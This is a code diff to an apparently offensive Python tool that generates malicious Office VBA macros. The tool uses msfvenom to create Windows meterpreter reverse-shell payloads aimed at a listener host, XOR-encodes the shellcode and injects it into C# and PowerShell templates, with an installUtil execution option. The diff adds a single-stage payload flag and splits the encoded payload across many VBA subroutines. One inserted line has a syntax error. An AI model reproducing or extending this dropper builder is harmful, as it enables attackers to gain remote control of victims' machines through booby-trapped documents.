@@ -62,13 +62,32 @@ def createMacro(arch, windows):
 
     fout = open(macroFile, 'w')
 
+    funNum =0
+
     for line in macroLines:
         if '$$$ENCODED$$$' in line:
+            enc = ""
+            for idx in range(0,funNum+1):
+                enc += "funFun(" + str(idx) + ")"
+            line = line.replace('$$$ENCODED$$$', enc)
+
+        if '$$$SUBCAT$$$' in line:
             encoded = encodeFile(shellFile)
-            encodedChunked = ""
+            idx = 0
+            encodedChunked = "Sub funFun" + str(funNum) + "(ByRef encIn As String)\n"
             for chunk in chunkString(encoded):
-                encodedChunked += "enc = enc & \""+ chunk + "\"\n"
-            line = line.replace('$$$ENCODED$$$', encodedChunked)
+                encodedChunked += "encIn = encIn & \""+ chunk + "\"\n"
+                idx = idx + 1
+                if(idx > 20):
+                    encodedChunked += "End Sub\n\n"
+                    funNum = funNum + 1
+                    encodedChunked += "Sub funFun" + str(funNum) + "ByRef encIn As String)\n"
+                    idx = 0
+
+            if idx == 0:
+                encodedChunked += "End Sub\n\n"
+
+            line = line.replace('$$$SUBCAT$$$', encodedChunked)
         elif '$$$COMPILE$$$' in line:
             line = line.replace('$$$COMPILE$$$', 'compCmd = \"' + CompileCmd + onDiskExeName + " " + onDiskFileName + '\"')
         elif '$$$RUN$$$' in line:
@@ -81,7 +100,7 @@ def createMacro(arch, windows):
     fout.close()
 
 def chunkString(inString):
-    chunks, chunk_size = len(inString), len(inString)/60
+    chunks, chunk_size = len(inString), 80
     return [ inString[i:i+chunk_size] for i in range(0, chunks, chunk_size) ]
 
 
@@ -131,14 +150,18 @@ def injectShellcode(script, runNormal, key):
 
     fout.close()
 
-def createShellCode(arch, protocol, lhost, lport):
+def createShellCode(arch, protocol, lhost, lport, single):
     msfCall = 'msfvenom'
     msfPayload = 'windows/'
 
     if arch == 'x64':
         msfPayload += 'x64/'
 
-    msfPayload += 'meterpreter/reverse_' + protocol
+    if single == True:
+        msfPayload += 'meterpreter_reverse_' + protocol
+    else:
+        msfPayload += 'meterpreter/reverse_' + protocol
+    
     msfLhost = 'lhost=' + lhost
     msfLport = 'lport=' + lport
 
@@ -156,11 +179,12 @@ if __name__== "__main__":
     parser.add_argument('-l', '--lhost', required=True, help='Listener Host')
     parser.add_argument('-p', '--lport', required=True, help='Listener Port')
     parser.add_argument('-n', '--normal', action='store_true', help='Allow payload to be executed without installUtil')
+    parser.add_argument('-s', '--single', action='store_true', help='Use a single-stage payload')
     args = parser.parse_args()
 
     xorKey = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(10))
     
-    createShellCode( args.arch, args.protocol, args.lhost, args.lport )
+    createShellCode( args.arch, args.protocol, args.lhost, args.lport, args.single )
     shellScript = grabCSTemplate()
     psScript = grabPSTemplate()
     createPsScript(psScript)
